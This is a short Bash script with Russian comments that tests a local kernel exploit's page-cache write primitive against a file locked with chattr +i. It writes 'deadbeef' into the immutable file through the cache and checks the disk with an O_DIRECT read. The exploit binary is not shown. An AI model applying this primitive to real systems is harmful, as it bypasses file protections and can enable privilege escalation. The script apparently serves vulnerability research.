#!/bin/bash
# F2c: примитив против immutable-флага (chattr +i)
set -u
cd ~/exploit

echo "=== F2c: файл с immutable-флагом ==="
head -c 1200 /dev/urandom > /tmp/imm
chmod 644 /tmp/imm
sudo sh -c 'sync; echo 3 > /proc/sys/vm/drop_caches'
cat /tmp/imm > /dev/null        # чистые страницы в кэше
sudo chattr +i /tmp/imm
lsattr /tmp/imm
echo "--- контроль: обычная запись отклоняется:"
(echo x >> /tmp/imm) 2>&1 | head -1
echo "--- запуск эксплоита:"
./exploit /tmp/imm 100 deadbeef 2>&1 | grep -E "теперь|\[-\]|примитив"
python3 - <<'EOF'
d = open("/tmp/imm", "rb").read()
print("через кэш, deadbeef на:", d.find(bytes.fromhex("deadbeef")))
EOF
echo "--- диск (O_DIRECT):"
sudo dd if=/tmp/imm of=/tmp/imm_direct bs=512 count=1 iflag=direct 2>/dev/null
python3 - <<'EOF'
d = open("/tmp/imm_direct", "rb").read()
print("на диске, deadbeef на:", d.find(bytes.fromhex("deadbeef")))
EOF
sudo chattr -i /tmp/imm
rm -f /tmp/imm /tmp/imm_direct
echo "(флаг снят, файл удалён)"
